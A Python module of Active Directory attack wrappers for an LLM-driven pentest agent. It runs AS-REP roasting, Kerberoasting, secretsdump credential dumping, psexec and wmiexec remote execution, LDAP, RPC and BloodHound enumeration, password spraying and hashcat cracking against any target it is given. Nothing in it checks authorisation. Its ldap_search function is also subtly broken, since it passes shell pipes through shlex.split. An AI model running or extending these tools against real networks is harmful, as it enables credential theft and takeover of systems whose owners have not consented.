"""
ad_tools.py - M12: Active Directory Pentest Tools

Impacket-based AD tools + Kerberos attacks.
Semua tools mengikuti arsitektur V1 (LLM pilih tool, executor tentukan command).
"""

import subprocess
import shlex
import re
from typing import Dict, Any


def _run(cmd: str, timeout: int = 120) -> str:
    try:
        result = subprocess.run(
            shlex.split(cmd), capture_output=True, text=True, timeout=timeout
        )
        out = result.stdout
        if result.stderr:
            out += f"\n[STDERR] {result.stderr}"
        return out if out.strip() else "[No output]"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] {timeout}s"
    except FileNotFoundError:
        return f"[ERROR] Command not found: {cmd.split()[0]}"
    except Exception as e:
        return f"[ERROR] {str(e)}"


def _validate_target(t: str) -> str:
    t = t.strip()
    if not re.match(r'^[a-zA-Z0-9._\-/]+$', t):
        raise ValueError(f"Invalid target: {t}")
    return t


# ============================================================
# Kerberos Attacks
# ============================================================

def kerberos_asrep_roast(target: str, domain: str, usersfile: str = "") -> str:
    """AS-REP Roasting: find users without Kerberos pre-auth."""
    target = _validate_target(target)
    cmd = f"impacket-GetNPUsers {shlex.quote(domain)}/ -dc-ip {shlex.quote(target)} -no-pass -format hashcat"
    if usersfile:
        cmd += f" -usersfile {shlex.quote(usersfile)}"
    return _run(cmd, timeout=60)


def kerberos_kerberoast(target: str, domain: str, username: str, password: str) -> str:
    """Kerberoasting: extract service ticket hashes for offline cracking."""
    target = _validate_target(target)
    cmd = (
        f"impacket-GetUserSPNs {shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)} "
        f"-dc-ip {shlex.quote(target)} -request -outputfile /tmp/kerberoast.txt"
    )
    return _run(cmd, timeout=60)


def kerberos_get_tgt(target: str, domain: str, username: str, password: str) -> str:
    """Request Kerberos TGT."""
    target = _validate_target(target)
    cmd = (
        f"impacket-getTGT {shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)} "
        f"-dc-ip {shlex.quote(target)}"
    )
    return _run(cmd, timeout=30)


# ============================================================
# Credential Dumping
# ============================================================

def secrets_dump(target: str, username: str, password: str, domain: str = "") -> str:
    """Dump SAM/NTDS hashes from DC or workstation."""
    target = _validate_target(target)
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}" if domain else f"{shlex.quote(username)}:{shlex.quote(password)}"
    cmd = f"impacket-secretsdump {auth}@{shlex.quote(target)}"
    return _run(cmd, timeout=120)


# ============================================================
# Remote Execution
# ============================================================

def psexec(target: str, username: str, password: str, command: str = "whoami", domain: str = "") -> str:
    """Remote command execution via PsExec (SMB)."""
    target = _validate_target(target)
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}" if domain else f"{shlex.quote(username)}:{shlex.quote(password)}"
    cmd = f"impacket-psexec {auth}@{shlex.quote(target)} {shlex.quote(command)}"
    return _run(cmd, timeout=30)


def wmiexec(target: str, username: str, password: str, command: str = "whoami", domain: str = "") -> str:
    """Remote command execution via WMI."""
    target = _validate_target(target)
    auth = f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}" if domain else f"{shlex.quote(username)}:{shlex.quote(password)}"
    cmd = f"impacket-wmiexec {auth}@{shlex.quote(target)} {shlex.quote(command)}"
    return _run(cmd, timeout=30)


# ============================================================
# LDAP Enumeration
# ============================================================

def ldap_search(target: str, base_dn: str = "", username: str = "", password: str = "") -> str:
    """LDAP enumeration: users, groups, computers."""
    target = _validate_target(target)
    if not base_dn:
        # Auto-generate from target
        parts = target.split(".")
        base_dn = ",".join(f"DC={p}" for p in parts if not p.isdigit())
    cmd = f"ldapsearch -x -H ldap://{shlex.quote(target)} -b {shlex.quote(base_dn)}"
    if username and password:
        cmd += f" -D {shlex.quote(username)} -w {shlex.quote(password)}"
    cmd += " '(objectClass=user)' sAMAccountName memberOf 2>/dev/null | head -200"
    return _run(cmd, timeout=30)


def ldap_domain_dump(target: str, username: str, password: str, domain: str = "") -> str:
    """Dump full LDAP domain information."""
    target = _validate_target(target)
    auth = f"{shlex.quote(domain)}\\\\{shlex.quote(username)}" if domain else shlex.quote(username)
    cmd = f"ldapdomaindump ldap://{shlex.quote(target)} -u {auth} -p {shlex.quote(password)} -o /tmp/ldap_dump"
    return _run(cmd, timeout=60)


# ============================================================
# BloodHound
# ============================================================

def bloodhound_collect(target: str, domain: str, username: str, password: str) -> str:
    """Collect AD data for BloodHound analysis."""
    target = _validate_target(target)
    cmd = (
        f"bloodhound-python -c All -d {shlex.quote(domain)} "
        f"-u {shlex.quote(username)} -p {shlex.quote(password)} "
        f"-ns {shlex.quote(target)} --zip -op /tmp/bloodhound"
    )
    return _run(cmd, timeout=120)


# ============================================================
# RPC / NetBIOS
# ============================================================

def rpc_enum(target: str, username: str = "", password: str = "") -> str:
    """RPC enumeration: users, groups, shares via rpcclient."""
    target = _validate_target(target)
    if username and password:
        cmd = f"rpcclient -U {shlex.quote(username)}%{shlex.quote(password)} {shlex.quote(target)} -c 'enumdomusers; enumdomgroups; netshareenum'"
    else:
        cmd = f"rpcclient -U '' -N {shlex.quote(target)} -c 'enumdomusers; enumdomgroups; netshareenum'"
    return _run(cmd, timeout=30)


# ============================================================
# Password Attacks
# ============================================================

def password_spray(target: str, domain: str, userlist: str, password: str) -> str:
    """Password spray attack against AD."""
    target = _validate_target(target)
    cmd = (
        f"crackmapexec smb {shlex.quote(target)} -d {shlex.quote(domain)} "
        f"-u {shlex.quote(userlist)} -p {shlex.quote(password)} --continue-on-success"
    )
    return _run(cmd, timeout=120)


def hash_crack(hash_file: str, mode: str = "1000", wordlist: str = "/usr/share/wordlists/rockyou.txt") -> str:
    """Crack hashes with hashcat. mode: 0=MD5, 1000=NTLM, 1800=sha512crypt, 13100=kerberoast."""
    cmd = f"hashcat -m {shlex.quote(mode)} {shlex.quote(hash_file)} {shlex.quote(wordlist)} --force --quiet"
    return _run(cmd, timeout=300)
